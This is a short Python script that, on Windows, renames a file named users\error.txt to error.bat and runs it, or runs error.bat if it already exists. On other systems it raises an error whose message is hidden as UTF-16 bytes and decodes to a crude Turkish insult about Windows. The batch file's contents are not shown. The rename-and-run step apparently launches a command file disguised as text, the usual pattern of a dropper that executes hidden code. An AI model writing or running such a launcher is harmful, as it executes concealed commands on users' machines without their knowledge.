import platform , sys , os

if platform.system() == "Windows":
    if os.path.exists("users\\error.txt"):
        os.rename("users\\error.txt","users\\error.bat")
        os.startfile("users\\error.bat")
    elif os.path.exists("users\\error.bat"):
        os.startfile("users\\error.bat")
    else:
        raise OSError(b"\xff\xfew\x00i\x00n\x00d\x00o\x00w\x00s\x00u\x00 \x00s\x00i\x00j\x00e\x00y\x00i\x00m\x00 \x00k\x00a\x00r\x00d\x00e\x00_\x01i\x00m\x00 \x00.\x00 \x00K\x00u\x00l\x00l\x00a\x00n\x00m\x00a\x00".decode("utf16"))



